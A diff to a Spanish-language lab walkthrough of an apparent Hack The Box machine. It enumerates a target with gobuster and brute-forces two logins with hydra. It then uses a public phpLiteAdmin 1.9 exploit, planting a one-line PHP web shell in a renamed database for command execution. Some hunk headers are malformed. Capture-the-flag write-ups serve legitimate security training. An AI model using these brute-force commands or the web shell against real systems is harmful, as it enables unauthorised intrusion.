@@ -22,17 +22,19 @@ PORT STATE SERVICE
 
 ```
 
-
+De primeras en el puerto 80 no hay nada a primera vista y en el 443 vemos una imagen simplemente.
 
 ![HTTP](/img/Pasted%20image%2020260423174644.png)
 
 ![HTTPS](/img/Pasted%20image%2020260423174757.png) 
 
+Hacemos fuzzing con un diccionario simple y de momento no parece haber algo interesante.
 ```bash
 gobuster dir --url http://10.129.23.159/ --wordlist /usr/share/wordlists/DirectoryDiscovery/common.txt
 ```
 ![](/img/Pasted%20image%2020260423175008.png) 
 
+En cambio al ampliar la enumeración con un diccionario más grande podemos descubrir un directorio que se llama department
 ```bash
 gobuster dir --url http://10.129.23.159/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-tls-validation 
 
@@ -40,76 +42,71 @@ gobuster dir --url http://10.129.23.159/ --wordlist /usr/share/wordlists/dirbust
 
 ![](/img/Pasted%20image%2020260423182707.png)
 
-  
+  Al entrar vemos que es un simple login que posteriormente usaremos.
 
-![](Pasted%20image%2020260423182723.png)
 ![](/img/Pasted%20image%2020260423182723.png)
 #### Enumeración HTTPS 
-
+Ahora procederemos a hacer fuzzing al puerto 443 y descubrimos el directorio /db
 ```bash 
 gobuster dir --url https://10.129.23.159/ --wordlist /usr/share/wordlists/DirectoryDiscovery/common.txt --no-tls-validation
 ```
 
-![](Pasted%20image%2020260423175642.png) 
 ![](/img/Pasted%20image%2020260423175642.png) 
 
-
-![](Pasted%20image%2020260423175747.png) 
+Al comprobarlo podemos ver que es un login del software phpLiteAdmin v1.9 
 ![](/img/Pasted%20image%2020260423175747.png) 
 
 ## Explotación
 ### HTTPS
-@ -54,34 +54,34 @@ Ya que es un simple login con solo el input de la contraseña le haremos fuerza
-hydra -l none -P /usr/share/wordlists/rockyou.txt 10.129.23.159  https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password" -t 64 -V
-```
+Ya que es un simple login con solo el input de la contraseña le hacemos fuerza bruta
 
-![](Pasted%20image%2020260423180737.png)
+``` bash
+hydra -l none -P /usr/share/wordlists/rockyou.txt 10.129.23.159  https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password" -t 64 -V
+``` 
+
 ![](/img/Pasted%20image%2020260423180737.png)
 
-
-![](Pasted%20image%2020260423181116.png)
+Usamos las credenciales y estaremos correctamente dentro del panel de control
 ![](/img/Pasted%20image%2020260423181116.png)
 
-Investigamos y vemos que tiene varios exploits, procederé a usar este https://www.exploit-db.com/exploits/24044
+Investigamos el software y vemos que tiene varios exploits, procederé a usar el siguiente https://www.exploit-db.com/exploits/24044
 
-![](Pasted%20image%2020260423175849.png) 
 ![](/img/Pasted%20image%2020260423175849.png) 
 
-Para el exploit debemos renonmbrar la base de datos, en mi caso la llamaré ninevehNotes.php
-![](Pasted%20image%2020260423190525.png)
+Para el exploit debemos renombrar la base de datos, en mi caso la llamaré ninevehNotes.php
+
 ![](/img/Pasted%20image%2020260423190525.png)
 
-Una vez creado debemos hacer una tabla nueva 
 Una vez creado debemos hacer una tabla nueva y añadirle la reverse shell
 
-![](Pasted%20image%2020260423181506.png)
 ![](/img/Pasted%20image%2020260423181506.png)
 
 
-![](Pasted%20image%2020260423190633.png)
+Con una simple web shell de php como por ejemplo
+ ```php
+ <?php system($REQUEST["cmd"]); ?>
+ ```
+
 ![](/img/Pasted%20image%2020260423190633.png)
 
 
-Vemos que la base de datos está en el directorio /var/tmp
-![](Pasted%20image%2020260423190525.png) 
+
 Vemos que la base de datos está en el directorio /var/tmp en Rename Database
 ![](/img/Pasted%20image%2020260423190525.png) 
 
 ### HTTP
 Mediante una pequeña trampa podemos saber que el usuario que acepta te indica si es válido o no 
-![](Pasted%20image%2020260423182953.png) 
 ![](/img/Pasted%20image%2020260423182953.png) 
 
-![](Pasted%20image%2020260423183028.png) 
+
 ![](/img/Pasted%20image%2020260423183028.png) 
+
 
 Así que haciendo fuerza bruta al login intentaremos averiguar la contraseña.
 ```bash
-@ -89,60 +89,60 @@ hydra -l none -P /usr/share/wordlists/rockyou.txt 10.129.23.159  http-post-form
+hydra -l none -P /usr/share/wordlists/rockyou.txt 10.129.23.159  http-post-form
 ``` 
-
-
-![](Pasted%20image%2020260423183147.png) 
+ 
 ![](/img/Pasted%20image%2020260423183147.png) 
 
 Una vez dentro buscaremos posibles vectores de ataque
